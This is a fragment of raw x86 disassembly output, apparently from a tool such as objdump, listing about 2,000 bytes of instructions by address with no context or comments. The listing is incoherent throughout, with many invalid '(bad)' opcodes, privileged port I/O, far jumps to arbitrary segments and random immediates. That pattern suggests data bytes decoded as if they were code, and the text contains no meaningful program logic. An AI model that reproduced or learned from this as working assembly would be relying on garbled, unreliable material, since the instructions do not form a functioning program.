  412d25:	inc    eax
  412d26:	sbb    BYTE PTR [ecx],al
  412d28:	in     eax,0x2e
  412d2a:	inc    edi
  412d2b:	xchg   ebp,eax
  412d2c:	pop    ds
  412d2d:	jge    0x412d0c
  412d2f:	js     0x412ccb
  412d31:	test   al,0x3f
  412d33:	imul   edx,ebx,0x33
  412d36:	mov    DWORD PTR [ebx-0x568049e0],esi
  412d3c:	jo     0x412d08
  412d3e:	(bad)
  412d41:	icebp  
  412d42:	shr    DWORD PTR [edi-0x6c],1
  412d45:	inc    edx
  412d46:	stos   BYTE PTR es:[edi],al
  412d47:	adc    ebx,edx
  412d49:	loop   0x412daa
  412d4b:	bound  edi,QWORD PTR ds:0xa0c90aa4
  412d51:	call   0x3b4a:0x3524d31c
  412d58:	cld    
  412d59:	mov    BYTE PTR ss:[eax-0x6ae254cc],bh
  412d60:	xor    ebx,esi
  412d62:	dec    eax
  412d63:	add    BYTE PTR [esi+eax*8],al
  412d66:	mov    BYTE PTR [edi+0x1b23289c],ah
  412d6c:	jle    0x412d89
  412d6e:	mov    ebp,0x502437a0
  412d73:	xor    esp,DWORD PTR [ebx+0x30]
  412d76:	mov    eax,0x8acf841
  412d7b:	cmp    eax,0x138f0b21
  412d80:	sub    ch,BYTE PTR [ebx+ebx*2+0x4f]
  412d84:	(bad)  [edi]
  412d86:	pop    eax
  412d87:	fldlg2 
  412d89:	dec    edx
  412d8a:	jno    0x412d92
  412d8c:	cmp    edx,edx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	in     eax,dx
  412d90:	xor    cl,BYTE PTR [edx+0x41]
  412d93:	jp     0x412d4c
  412d95:	ins    BYTE PTR es:[edi],dx
  412d96:	rcl    BYTE PTR ss:[esi],cl
  412d99:	mov    ecx,0x46e918fe
  412d9e:	push   ecx
  412d9f:	jp     0x412d90
  412da1:	fstp   DWORD PTR [edi+0x376c54b0]
  412da7:	push   0xc621b98d
  412dac:	iret   
  412dad:	xchg   esp,eax
  412dae:	call   0xe012:0x6be722c1
  412db5:	jp     0x412e1d
  412db7:	ret    0xac95
  412dba:	and    eax,0x98dfaf87
  412dbf:	pop    ss
  412dc0:	mov    esi,0xb255471b
  412dc5:	jb     0x412d66
  412dc7:	cmp    DWORD PTR [edi-0x3b179302],0xffffffb9
  412dce:	jnp    0x412e0b
  412dd0:	or     cl,BYTE PTR [eax]
  412dd2:	stc    
  412dd3:	mov    WORD PTR [ebp+0x49],cs
  412dd6:	retf   
  412dd7:	adc    al,0xdb
  412dd9:	in     eax,0x73
  412ddb:	inc    edi
  412ddc:	adc    edx,DWORD PTR [ebx]
  412dde:	fs jns 0x412df9
  412de1:	sub    BYTE PTR [ebx],ch
  412de3:	xor    edi,DWORD PTR [ebx+edi*4-0x747e7d30]
  412dea:	push   es
  412deb:	repnz in al,dx
  412ded:	mov    BYTE PTR [ebx],bh
  412def:	or     DWORD PTR [esi-0x7135cc69],edx
  412df5:	sbb    BYTE PTR [ebx+0x3],bl
  412df8:	cmp    al,0x80
  412dfa:	dec    esi
  412dfb:	hlt    
  412dfc:	fisub  DWORD PTR [ecx+edx*1]
  412dff:	test   eax,0xdc7607d3
  412e04:	sub    eax,0x6e7620c6
  412e09:	call   0x54c5ee0d
  412e0e:	js     0x412dce
  412e10:	cmp    eax,0x9bcedabb
  412e15:	fistp  WORD PTR [edi]
  412e17:	add    DWORD PTR ss:0x82f67dd4,ecx
  412e1e:	outs   dx,DWORD PTR ds:[esi]
  412e1f:	mov    eax,0x2bed2221
  412e24:	outs   dx,DWORD PTR ds:[esi]
  412e25:	push   ss
  412e26:	cmp    dh,dh
  412e28:	ficomp WORD PTR [ebp+eax*2+0x7e]
  412e2c:	mov    eax,0x1012dff2
  412e31:	mov    al,0xe7
  412e33:	adc    ecx,DWORD PTR [ebx+0x477ca1da]
  412e39:	arpl   sp,cx
  412e3b:	jno    0x412eb0
  412e3d:	in     eax,dx
  412e3e:	inc    BYTE PTR [esi-0xf52ca19]
  412e44:	mov    ds:0xe0a2a098,eax
  412e49:	jno    0x412e83
  412e4b:	mov    al,ds:0xff25cd9e
  412e50:	adc    eax,0x37670823
  412e55:	mov    ah,0xd6
  412e57:	xlat   BYTE PTR ds:[ebx]
  412e58:	adc    ebx,edi
  412e5a:	add    al,0x4
  412e5c:	fld    DWORD PTR [ebx+0x5c0f3613]
  412e62:	mov    esp,0xf6bce7f3
  412e67:	sub    BYTE PTR [edx+0x408aac79],bh
  412e6d:	loop   0x412e3a
  412e6f:	mov    edi,0x2265e50
  412e74:	jge    0x412e1c
  412e76:	rol    DWORD PTR [ecx-0x28],1
  412e79:	and    eax,0xfea84a7
  412e7e:	push   edi
  412e7f:	inc    esp
  412e80:	cmp    al,BYTE PTR [ecx-0xd066fa1]
  412e86:	mov    ah,0x50
  412e88:	shl    DWORD PTR [edx+0x635b3201],0x1a
  412e8f:	daa    
  412e90:	and    bh,dh
  412e92:	xchg   edi,eax
  412e93:	inc    edx
  412e94:	test   al,0xde
  412e96:	loopne 0x412edc
  412e98:	and    DWORD PTR [esi-0x80],esi
  412e9b:	and    al,0x83
  412e9d:	add    ebx,edx
  412e9f:	sti    
  412ea0:	xchg   edi,eax
  412ea1:	outs   dx,DWORD PTR ds:[esi]
  412ea2:	scas   eax,DWORD PTR es:[edi]
  412ea3:	xchg   BYTE PTR [edx-0x15],ch
  412ea6:	or     DWORD PTR [ecx],ebx
  412ea8:	lahf   
  412ea9:	and    al,0xbb
  412eab:	enter  0xedc0,0x88
  412eaf:	(bad)  
  412eb1:	(bad)  
  412eb2:	mov    al,ds:0xa1c8f824
  412eb7:	std    
  412eb8:	stos   BYTE PTR es:[edi],al
  412eb9:	(bad)  
  412eba:	mov    dh,0x87
  412ebc:	sahf   
  412ebd:	mov    al,ds:0xfeb3a94f
  412ec2:	and    BYTE PTR [ecx+ebp*8],0x9a
  412ec6:	in     eax,0x96
  412ec8:	daa    
  412ec9:	xchg   esp,eax
  412eca:	shr    DWORD PTR [ebx-0x4e],cl
  412ecd:	sahf   
  412ece:	leave  
  412ecf:	xor    edi,DWORD PTR [edi+0x3b]
  412ed2:	(bad)  
  412ed3:	jne    0x412e67
  412ed5:	mov    eax,ds:0x8c300567
  412eda:	fwait
  412edb:	dec    eax
  412edc:	mov    ebp,DWORD PTR [ebx+0x71]
  412edf:	xor    bl,ch
  412ee1:	retf   0x355a
  412ee4:	jmp    0x3918:0x7f6ae2c1
  412eeb:	outs   dx,BYTE PTR ds:[esi]
  412eec:	xor    dl,BYTE PTR [edx-0x46fd5223]
  412ef2:	mov    cl,0x35
  412ef4:	and    cl,al
  412ef6:	test   ebx,eax
  412ef8:	sub    eax,0xccf834be
  412efd:	inc    ebx
  412efe:	xchg   edi,eax
  412eff:	dec    ebx
  412f00:	push   0xffffffba
  412f02:	rol    BYTE PTR [eax],1
  412f04:	outs   dx,DWORD PTR ds:[esi]
  412f05:	es pop edi
  412f07:	sbb    al,0x35
  412f09:	(bad)  
  412f0a:	adc    eax,0x14a280d2
  412f0f:	sub    al,0xf6
  412f11:	push   0xb5503f30
  412f16:	adc    al,0xfa
  412f18:	inc    esp
  412f19:	(bad)  
  412f1b:	sub    BYTE PTR [ebx],ch
  412f1d:	mov    ecx,0x80a4eb02
  412f22:	in     al,0x7e
  412f24:	cmp    al,0x47
  412f26:	aam    0xc7
  412f28:	push   esp
  412f29:	cli    
  412f2a:	push   esp
  412f2b:	jb     0x412edd
  412f2d:	div    DWORD PTR [ecx-0x79e51b56]
  412f33:	xchg   dh,dh
  412f35:	cdq    
  412f36:	js     0x412edb
  412f38:	aas    
  412f39:	jae    0x412f2d
  412f3b:	jmp    0x412edf
  412f3d:	dec    edx
  412f3e:	push   0xfb71977
  412f43:	cmp    esp,esp
  412f45:	call   0xc758:0xbaac6ed7
  412f4c:	lods   al,BYTE PTR ds:[esi]
  412f4d:	lods   al,BYTE PTR ds:[esi]
  412f4e:	sub    eax,0xf36cdab7
  412f53:	hlt    
  412f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f55:	mov    eax,0x95b6b83f
  412f5a:	mov    WORD PTR [esi+0xb1cc8fe],ss
  412f60:	repnz pop ebp
  412f62:	ret    0x5a14
  412f65:	or     eax,0x32aacd54
  412f6a:	cwde   
  412f6b:	jecxz  0x412f41
  412f6d:	inc    ebx
  412f6e:	lahf   
  412f6f:	add    edx,esp
  412f71:	es or  eax,0x90cae70
  412f77:	popa   
  412f78:	add    BYTE PTR [edx-0x68932495],bh
  412f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f7f:	aaa    
  412f80:	scas   al,BYTE PTR es:[edi]
  412f81:	jl     0x412f8a
  412f83:	test   al,0xec
  412f85:	mov    ch,ch
  412f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f88:	xor    ecx,esi
  412f8a:	(bad)  [esi+0x48f1375f]
  412f90:	or     al,0x4f
  412f92:	dec    ebx
  412f93:	add    eax,0x5133452
  412f98:	enter  0x4710,0x2b
  412f9c:	add    BYTE PTR ds:0x887d7a8e,cl
  412fa2:	pop    edi
  412fa3:	jb     0x412fad
  412fa5:	xchg   edx,eax
  412fa6:	(bad)  
  412fa7:	enter  0xcfd9,0xc3
  412fab:	jnp    0x412fdc
  412fad:	in     eax,0xc
  412faf:	pop    esp
  412fb0:	mov    esi,0xc54b2c9b
  412fb5:	push   ecx
  412fb6:	push   ebp
  412fb7:	adc    al,0xb8
  412fb9:	stos   DWORD PTR es:[edi],eax
  412fba:	push   es
  412fbb:	jmp    DWORD PTR [eax+0xea85a75]
  412fc1:	dec    ebp
  412fc2:	push   eax
  412fc3:	ret    0x2e31
  412fc6:	sub    DWORD PTR [eax+0x7b],esi
  412fc9:	mov    bh,0xa6
  412fcb:	rol    dl,cl
  412fcd:	pusha  
  412fce:	retw   
  412fd0:	aas    
  412fd1:	xchg   edi,eax
  412fd2:	jmp    0x8e718d84
  412fd7:	js     0x413012
  412fd9:	(bad)  
  412fda:	int3   
  412fdb:	outs   dx,DWORD PTR ds:[esi]
  412fdc:	scas   al,BYTE PTR es:[edi]
  412fdd:	aam    0xf1
  412fdf:	dec    edi
  412fe0:	xchg   DWORD PTR [ecx],ebx
  412fe2:	(bad)  
  412fe3:	(bad)  
  412fe4:	ret    0xe5ba
  412fe7:	in     al,dx
  412fe8:	cmp    DWORD PTR [esi+0x322c3f35],ebx
  412fee:	add    DWORD PTR [eax],esi
  412ff0:	add    ch,BYTE PTR [edx-0x1]
  412ff3:	mov    ebx,0xa36f5740
  412ff8:	and    dh,dh
  412ffa:	push   0xffffffcd
  412ffc:	sahf   
  412ffd:	(bad)  [ecx-0x31]
  413000:	pop    esi
  413001:	ds or  al,0xc
  413004:	addr16 in eax,0x49
  413007:	dec    ecx
  413008:	push   edi
  413009:	sahf   
  41300a:	clc    
  41300b:	in     eax,0x4d
  41300d:	sbb    cl,dl
  41300f:	cld    
  413010:	cmp    al,0xf3
  413012:	icebp  
  413013:	or     al,0xf1
  413015:	in     al,0x9
  413017:	cli    
  413018:	ins    BYTE PTR es:[edi],dx
  413019:	call   0xb474a584
  41301e:	cs push ebx
  413020:	(bad)  
  413021:	push   edx
  413022:	add    ecx,esp
  413024:	imul   esp,DWORD PTR [ebx-0x56],0xffffffc4
  413028:	shr    BYTE PTR [esp+edi*8+0x7d000bee],1
  41302f:	xor    eax,0xe8ee6699
  413034:	xor    ebp,ebp
  413036:	xor    BYTE PTR cs:[esi-0x1f],ah
  41303a:	jl     0x4130a1
  41303c:	push   cs
  41303d:	push   es
  41303e:	dec    esi
  41303f:	cs sub bl,al
  413042:	jns    0x413064
  413044:	sub    eax,0xebe58249
  413049:	xchg   esi,eax
  41304a:	and    ch,bl
  41304c:	and    DWORD PTR [eax],edi
  41304e:	cmc    
  41304f:	jl     0x4130ae
  413051:	adc    esp,DWORD PTR [edx+0x174a3c11]
  413057:	(bad)  
  413059:	push   ecx
  41305a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41305b:	push   0x1feab680
  413060:	aas    
  413061:	inc    ebp
  413062:	add    BYTE PTR [edx+eax*8-0x5b15e00e],al
  413069:	dec    eax
  41306a:	data16 cli 
  41306c:	and    eax,0x79d237c2
  413071:	xor    cl,ch
  413073:	int3   
  413074:	jnp    0x413011
  413076:	(bad)  
  413077:	les    eax,FWORD PTR [esi+eiz*8-0x24]
  41307b:	mov    ebx,0xf510d3d7
  413080:	jb     0x413032
  413082:	mov    es,WORD PTR [edx*1-0x40f63b69]
  413089:	test   al,0x40
  41308b:	in     eax,dx
  41308c:	mov    esp,DWORD PTR [edi+0x5b0dd40f]
  413092:	jb     0x4130e9
  413094:	fadd   DWORD PTR [eax]
  413096:	dec    ebx
  413097:	jp     0x413100
  413099:	sub    BYTE PTR [eax-0xc],bl
  41309c:	dec    ebx
  41309d:	dec    edi
  41309e:	pop    edx
  41309f:	xchg   BYTE PTR es:[eax],ah
  4130a2:	mov    dh,0xb9
  4130a4:	(bad)  
  4130a5:	in     al,0x26
  4130a7:	rol    BYTE PTR [edi+0x46708c70],cl
  4130ad:	daa    
  4130ae:	call   0x7f4f57e6
  4130b3:	pop    ecx
  4130b4:	lock sub ebx,DWORD PTR [ebp-0x23b40c25]
  4130bb:	(bad)  
  4130be:	push   esp
  4130bf:	jg     0x41308b
  4130c1:	scas   eax,DWORD PTR es:[edi]
  4130c2:	repnz mov edi,0x466ac408
  4130c8:	add    eax,0xc4ff6961
  4130cd:	jl     0x41308d
  4130cf:	mov    esi,0xe3d158c2
  4130d4:	dec    ebp
  4130d5:	test   BYTE PTR [esi],al
  4130d7:	pop    ebx
  4130d8:	(bad)  
  4130d9:	sti    
  4130da:	or     DWORD PTR [edi],ecx
  4130dc:	dec    edi
  4130dd:	xlat   BYTE PTR ds:[ebx]
  4130de:	jge    0x4130f0
  4130e0:	lock xor al,0xd9
  4130e3:	cmc    
  4130e4:	imul   edi,DWORD PTR [edi-0x4a],0xbae1dafc
  4130eb:	int    0x69
  4130ed:	dec    ecx
  4130ee:	ret    
  4130ef:	(bad)  [ecx]
  4130f1:	and    esp,esi
  4130f3:	adc    al,BYTE PTR [eax+0x3b]
  4130f6:	sub    eax,ebx
  4130f8:	cmp    BYTE PTR [ebp-0x75cde6f8],0xea
  4130ff:	mov    al,0x56
  413101:	jmp    0x5b5b:0x692cffae
  413108:	or     esi,DWORD PTR [edi]
  41310a:	mov    BYTE PTR [eax+eiz*4],dh
  41310d:	(bad)  
  41310f:	out    dx,eax
  413110:	dec    esp
  413111:	test   eax,0xb406c710
  413116:	pop    eax
  413117:	loope  0x4130ee
  413119:	jge    0x413109
  41311b:	ret    
  41311c:	leave  
  41311d:	inc    ecx
  41311e:	dec    ebp
  41311f:	push   ss
  413120:	call   0x6da37747
  413125:	es adc eax,0xea875343
  41312b:	out    0x2a,eax
  41312d:	jo     0x4131ac
  41312f:	sbb    cl,al
  413131:	cli    
  413132:	dec    ecx
  413133:	jg     0x413182
  413135:	pusha  
  413136:	es xchg cl,dl
  413139:	cmc    
  41313a:	test   DWORD PTR [edx+0x4a],edx
  41313d:	mov    bl,0x25
  41313f:	jle    0x4131b9
  413141:	mov    ecx,0x282bf480
  413146:	fiadd  DWORD PTR [ebx-0x65aca145]
  41314c:	pop    ds
  41314d:	pop    ds
  41314e:	popf   
  41314f:	jecxz  0x41317d
  413151:	pop    edx
  413152:	sub    BYTE PTR [ebx+eax*2-0x399ca22f],al
  413159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41315a:	repz sahf 
  41315c:	jne    0x4131c3
  41315e:	mov    ecx,0xaf22ce62
  413163:	pop    ecx
  413164:	scas   al,BYTE PTR es:[edi]
  413165:	xchg   DWORD PTR [ecx+0xbe5110b],ecx
  41316b:	inc    eax
  41316c:	ins    DWORD PTR es:[edi],dx
  41316d:	stc    
  41316e:	or     al,0x2f
  413170:	adc    esp,DWORD PTR [edi-0x8]
  413173:	push   esi
  413174:	jo     0x413137
  413176:	push   cs
  413177:	mov    ebp,0xa7115a6c
  41317c:	adc    edi,DWORD PTR [edi+0x61]
  41317f:	punpcklbw mm2,DWORD PTR [edi]
  413182:	fsubr  DWORD PTR [ebx+0x74]
  413185:	add    BYTE PTR [ebp+ebp*1+0x26],ah
  413189:	xlat   BYTE PTR ds:[ebx]
  41318a:	jmp    0x4c56:0xbe49f66f
  413191:	pop    ecx
  413192:	hlt    
  413193:	in     al,dx
  413194:	int3   
  413195:	ds xchg ebx,eax
  413197:	cmp    al,0x27
  413199:	pop    ebx
  41319a:	push   0xaaa4a35e
  41319f:	inc    edx
  4131a0:	fcmovnu st,st(0)
  4131a2:	sbb    al,0x1e
  4131a4:	daa    
  4131a5:	je     0x413130
  4131a7:	adc    eax,0x6279f311
  4131ac:	fsubr  DWORD PTR [edi+0x64]
  4131af:	nop
  4131b0:	jl     0x41314f
  4131b2:	outs   dx,BYTE PTR ds:[esi]
  4131b3:	pop    esi
  4131b4:	rcr    DWORD PTR [ebp+0x35],cl
  4131b7:	sbb    BYTE PTR [edx],ah
  4131b9:	adc    bh,BYTE PTR [eax+0x62]
  4131bc:	dec    ecx
  4131bd:	and    DWORD PTR [edi+0x40],edi
  4131c0:	jno    0x4131bd
  4131c2:	and    BYTE PTR [edx-0xb],bl
  4131c5:	dec    esp
  4131c6:	mov    ss,WORD PTR [esi]
  4131c8:	mov    al,ds:0x4fbf5874
  4131cd:	jbe    0x4131fc
  4131cf:	sbb    ebp,DWORD PTR [esi-0x3c]
  4131d2:	xchg   edi,eax
  4131d3:	mov    bh,0xc7
  4131d5:	and    esp,edx
  4131d7:	leave  
  4131d8:	shr    ecx,0x44
  4131db:	mov    al,ds:0xaf2d6e71
  4131e0:	mov    eax,ds:0x13f5b27d
  4131e5:	jge    0x4131ef
  4131e7:	mov    dh,0x8b
  4131e9:	add    ecx,DWORD PTR [edx-0x4140cd3e]
  4131ef:	mov    BYTE PTR [eax-0x54c255e8],dh
  4131f5:	adc    eax,0xdbd0df0b
  4131fa:	ds inc ebp
  4131fc:	pop    ss
  4131fd:	shr    BYTE PTR [ecx-0x25],1
  413200:	or     al,0xcd
  413202:	test   eax,0xe9e40ec1
  413207:	(bad)  
  413208:	xor    DWORD PTR [esi-0x6bbfcef8],ebx
  41320e:	mov    ebp,0x69ba1013
  413213:	pop    ss
  413214:	arpl   WORD PTR [esi],dx
  413216:	dec    esi
  413217:	mov    edx,0x76ea9fe1
  41321c:	and    BYTE PTR [ebx+0x41120f71],dl
  413222:	or     al,0x5
  413224:	fnstenv [ebp+eiz*4-0x21]
  413228:	loop   0x41324c
  41322a:	ds leave 
  41322c:	enter  0x3730,0x41
  413230:	inc    ebp
  413231:	nop
  413232:	inc    edi
  413233:	shl    BYTE PTR [esi+0x2d9d085],1
  413239:	cmp    BYTE PTR ss:[ebp+0x28],ch
  41323d:	std    
  41323e:	imul   ebx,DWORD PTR [edx+0x4a],0x69ba08fc
  413245:	jl     0x4131cb
  413247:	jo     0x41328f
  413249:	pop    DWORD PTR [eax]
  41324b:	test   DWORD PTR [ebx],esp
  41324d:	jmp    0x90f46bbd
  413252:	mov    al,ds:0x5e7fe734
  413257:	cmp    eax,0x1b28255c
  41325c:	in     eax,dx
  41325d:	push   esi
  41325e:	pop    ss
  41325f:	push   esp
  413260:	xchg   ebx,eax
  413261:	or     al,0x12
  413263:	xor    edx,DWORD PTR [ecx+0x56]
  413266:	push   cs
  413267:	ja     0x41326e
  413269:	mov    ch,0xd7
  41326b:	inc    edi
  41326c:	cld    
  41326d:	out    0x52,al
  41326f:	and    eax,DWORD PTR [edx+0xf]
  413272:	imul   edx,DWORD PTR [edi],0x52
  413275:	push   0x55adf287
  41327a:	dec    ebp
  41327b:	fwait
  41327c:	shl    BYTE PTR [ecx],1
  41327e:	push   eax
  41327f:	sbb    DWORD PTR [ebx+edi*2+0xe],0x5cf97b43
  413287:	jl     0x4132ba
  413289:	jge    0x4132e2
  41328b:	inc    ebp
  41328c:	or     ah,BYTE PTR [edi]
  41328e:	aad    0xb
  413290:	ret    
  413291:	ret    0xd68d
  413294:	into   
  413295:	inc    esp
  413296:	fs mov al,0x46
  413299:	jmp    edx
  41329b:	xchg   edi,eax
  41329c:	retf   0x9210
  41329f:	jns    0x4132ce
  4132a1:	adc    DWORD PTR [edi+0x4b],0x18f33034
  4132a8:	mov    bl,0xe6
  4132aa:	add    eax,0xd526f101
  4132af:	mov    edi,0x30592f8
  4132b4:	stos   BYTE PTR es:[edi],al
  4132b5:	or     DWORD PTR [ecx-0x5479d914],edx
  4132bb:	cli    
  4132bc:	aad    0x33
  4132be:	mov    ds:0xdc8d620d,al
  4132c3:	dec    ebx
  4132c4:	cmp    bh,0x8b
  4132c7:	mov    bh,BYTE PTR [ebx-0x17]
  4132ca:	jno    0x413348
  4132cc:	push   es
  4132cd:	pop    ecx
  4132ce:	test   DWORD PTR [ecx-0x768b44db],edi
  4132d4:	push   DWORD PTR [ebp+0x3317f622]
  4132da:	sub    DWORD PTR [ebp-0x23b9dff3],ecx
  4132e0:	jmp    0x413354
  4132e2:	jns    0x4132a1
  4132e4:	mov    al,0x74
  4132e6:	adc    esp,esp
  4132e8:	inc    edi
  4132e9:	fcom   QWORD PTR [ebx-0x8]
  4132ec:	scas   eax,DWORD PTR es:[edi]
  4132ed:	sbb    eax,0xe4cb260c
  4132f2:	dec    edi
  4132f3:	out    dx,eax
  4132f4:	outs   dx,BYTE PTR ds:[esi]
  4132f5:	mov    cl,0x6c
  4132f7:	inc    esi
  4132f8:	cmp    cl,BYTE PTR [esi]
  4132fa:	pop    esp
  4132fb:	bound  edx,QWORD PTR [esi+0x1f]
  4132fe:	loop   0x413317
  413300:	pop    bp
  413302:	mov    edx,0x7152a100
  413307:	jno    0x4132b4
  413309:	stc    
  41330a:	sbb    al,BYTE PTR [edx+0x4d83a4bb]
  413310:	pop    esi
  413311:	mov    BYTE PTR [edx+0x2c],dl
  413314:	aas    
  413315:	jnp    0x41329c
  413317:	jp     0x4132c9
  413319:	sbb    bh,cl
  41331b:	mov    edi,0xd9d486c1
  413320:	xchg   ebx,eax
  413321:	push   ds
  413322:	out    dx,eax
  413323:	xchg   eax,ebx
  413325:	push   0x10cfd1e0
  41332a:	out    dx,eax
  41332b:	cmp    BYTE PTR [ebp+0x28cd9067],bh
  413331:	mov    edx,edi
  413333:	call   0x1b16:0x91aa532e
  41333a:	push   edi
  41333b:	push   edx
  41333c:	mov    edi,0x942db09d
  413341:	add    edi,DWORD PTR [eax+0x569c2260]
  413347:	dec    ebp
  413348:	idiv   BYTE PTR [ebx-0x4b39b515]
  41334e:	mov    ch,0xef
  413350:	mov    ah,0x50
  413352:	(bad)  [edi-0x34b226d7]
  413358:	sbb    BYTE PTR ds:0x83ae228e,0x33
  41335f:	adc    DWORD PTR [ecx],ecx
  413361:	or     edx,edi
  413363:	push   esi
  413364:	xor    BYTE PTR [eax],cl
  413366:	lahf   
  413367:	mov    ebp,DWORD PTR [edi]
  413369:	sub    BYTE PTR [edi-0x743e9815],dh
  41336f:	jl     0x4133e9
  413371:	clc    
  413372:	adc    ecx,DWORD PTR [edi]
  413374:	pop    eax
  413375:	cld    
  413376:	push   dx
  413378:	pushf  
  413379:	push   esi
  41337a:	jmp    0x6498b817
  41337f:	push   ebp
  413380:	(bad)  
  413381:	cmc    
  413382:	aaa    
  413383:	mov    dl,0x2f
  413385:	inc    esi
  413386:	loope  0x41335b
  413388:	fst    st(1)
  41338a:	lods   eax,DWORD PTR ds:[esi]
  41338b:	or     bl,BYTE PTR [ebp-0x66]
  41338e:	sbb    esi,DWORD PTR [esi]
  413390:	xor    BYTE PTR [ecx+edi*4+0x2109a78e],bh
  413397:	ins    DWORD PTR es:[edi],dx
  413398:	or     al,0x6
  41339a:	add    DWORD PTR [ebx*8+0x22f63e3d],edx
  4133a1:	test   al,0xef
  4133a3:	es into 
  4133a5:	dec    edx
  4133a6:	(bad)  
  4133a8:	inc    esp
  4133a9:	or     dh,bl
  4133ab:	frstor [edi]
  4133ad:	repnz aaa 
  4133af:	std    
  4133b0:	mov    ch,0x46
  4133b2:	mov    edi,DWORD PTR [eax-0x1a20ed72]
  4133b8:	fdivr  st,st(0)
  4133ba:	pop    ecx
  4133bb:	xchg   DWORD PTR [edi+0x54],edx
  4133be:	mov    ebp,edx
  4133c0:	je     0x41337e
  4133c2:	retf   0x8022
  4133c5:	jb     0x413427
  4133c7:	stos   BYTE PTR es:[edi],al
  4133c8:	and    bh,ch
  4133ca:	out    dx,eax
  4133cb:	cmp    eax,0xd4e77fcd
  4133d0:	mov    DWORD PTR [eax-0x126339da],esi
  4133d6:	int    0xfb
  4133d8:	mov    dl,0x27
  4133da:	js     0x4133a1
  4133dc:	es pop ss
  4133de:	fs jmp 0x7e12:0xa054cdfe
  4133e6:	fld1   
  4133e8:	mov    dl,0xe3
  4133ea:	nop
  4133eb:	mov    edx,0x72f4727c
  4133f0:	xor    eax,0xafb166fc
  4133f5:	stos   DWORD PTR es:[edi],eax
  4133f6:	test   DWORD PTR [esi+eax*2],edx
  4133f9:	cmc    
  4133fa:	les    ebp,FWORD PTR [eax-0x48]
  4133fd:	arpl   WORD PTR [ecx-0x23],si
  413400:	ja     0x4133e3
  413402:	std    
  413403:	neg    ch
  413405:	jge    0x4133d2
  413407:	inc    eax
  413408:	das    
  413409:	inc    esi
  41340a:	cmc    
  41340b:	sub    cl,BYTE PTR [bx+di]
  41340e:	ret    0xb2e2
  413411:	fcomp  DWORD PTR [esi]
  413413:	and    al,0x4a
  413415:	jbe    0x413443
  413417:	jmp    0xb04014f3
  41341c:	sub    ebx,DWORD PTR [esi+ecx*4]
  41341f:	and    DWORD PTR [eax],edi
  413421:	sub    ah,BYTE PTR [eax]
  413423:	aad    0x86
  413425:	retf   
  413426:	sbb    ebx,DWORD PTR [edx-0x70988176]
  41342c:	mov    gs,WORD PTR [ecx+0x7228c808]
  413432:	jno    0x413498
  413434:	mov    ch,0xb9
  413436:	(bad)  
  413437:	fidivr DWORD PTR [ecx+ebp*1-0x83f0ef0]
  41343e:	xchg   ebp,eax
  41343f:	sbb    DWORD PTR [edi+0x35],ebp
  413442:	shr    dh,cl
  413444:	fwait
  413445:	outs   dx,BYTE PTR ds:[esi]
  413446:	dec    ecx
  413447:	mov    ebp,0xf6183513
  41344c:	push   es
  41344d:	push   edx
  41344e:	nop
  41344f:	inc    esp
  413450:	cmc    
  413451:	imul   ecx,ecx,0xb594bf3b
  413457:	imul   esp,DWORD PTR [edi],0x1a
  41345a:	leave  
  41345b:	adc    ch,BYTE PTR [edi]
  41345d:	cmp    ebx,DWORD PTR [ecx+0x26]
  413460:	mov    cl,0xab
  413462:	aas    
  413463:	int    0xf0
  413465:	dec    edi
  413466:	repz lahf 
  413468:	iret   
  413469:	stos   DWORD PTR es:[edi],eax
  41346a:	iret   
  41346b:	mov    BYTE PTR [ebp+0x4],bl
  41346e:	dec    ecx
  41346f:	inc    edi
  413470:	push   edx
  413471:	aam    0xc2
  413473:	pop    ecx
  413474:	jl     0x413447
  413476:	loopne 0x4134e6
  413478:	loopne 0x41346b
  41347a:	popf   
  41347b:	push   edx
  41347c:	adc    BYTE PTR [esi+0x71dda603],al
  413482:	hlt    
  413483:	mov    bh,0x87
  413485:	mov    dl,0x27
  413487:	add    sp,si
  41348a:	or     al,0x5
  41348c:	or     ah,BYTE PTR [esi]
  41348e:	and    BYTE PTR [edi],ah
  413490:	push   esp
  413491:	jb     0x413489
  413493:	pop    esp
  413494:	cmp    al,0xa9
  413496:	in     eax,dx
  413497:	test   BYTE PTR [edi-0x1c178407],al
  41349d:	das    
  41349e:	jmp    0x2c01d9a6
  4134a3:	fstp   DWORD PTR [ebx+ebx*1-0x3a]
  4134a7:	jo     0x4134d0
  4134a9:	jns    0x41349a
  4134ab:	(bad)  
  4134ac:	sub    al,0x63
  4134ae:	cli    
  4134af:	out    0x51,eax
  4134b1:	jge    0x413444
  4134b3:	and    BYTE PTR [ecx],bl
  4134b5:	fmul   QWORD PTR [ecx]
  4134b7:	cmp    ch,al
  4134b9:	ins    DWORD PTR es:[edi],dx
  4134ba:	popf   
  4134bb:	inc    ebp
  4134bc:	mov    al,ds:0x98b5ceaa
  4134c1:	adc    edx,esi
  4134c3:	fwait
  4134c4:	bts    edx,0xd1
  4134c8:	test   eax,0x42da6d9c
  4134cd:	daa    
  4134ce:	jle    0x41354a
  4134d0:	call   0x3474:0xb126adee
  4134d7:	sub    DWORD PTR [ebp+eiz*1-0x46],edi
  4134db:	pusha  
  4134dc:	sbb    ebp,DWORD PTR [ebp-0x73109489]
  4134e2:	xor    ebx,DWORD PTR [edx+ebp*8-0x25]
  4134e6:	push   esp
  4134e7:	adc    bl,bh
  4134e9:	and    eax,0x27e9365
  4134ee:	stos   BYTE PTR es:[edi],al
  4134ef:	jb     0x4134d3
  4134f1:	or     eax,0xe334843d
  4134f6:	cmp    bl,al
  4134f8:	aas    
  4134f9:	bound  bp,DWORD PTR [ebp+0xa]
  4134fd:	ja     0x413566
  4134ff:	dec    edx
  413500:	fwait
  413501:	xchg   ecx,eax
  413502:	outs   dx,DWORD PTR ds:[esi]
  413503:	jb     0x413553
  413505:	clc    
  413506:	xlat   BYTE PTR ds:[ebx]
  413507:	inc    esp
  413508:	fcompp 
  41350a:	test   al,0xc0
  41350c:	imul   eax,edi,0x4a570efe
  413512:	sbb    eax,0xde9d7f6f
  413517:	in     eax,0x3f
  413519:	mov    eax,ds:0x3a6f66cb
  41351e:	into   
  41351f:	inc    ebp
  413520:	out    dx,al
  413521:	pop    ecx
  413522:	arpl   WORD PTR [ebx+ebp*1],si
  413525:	retf   0x91d1
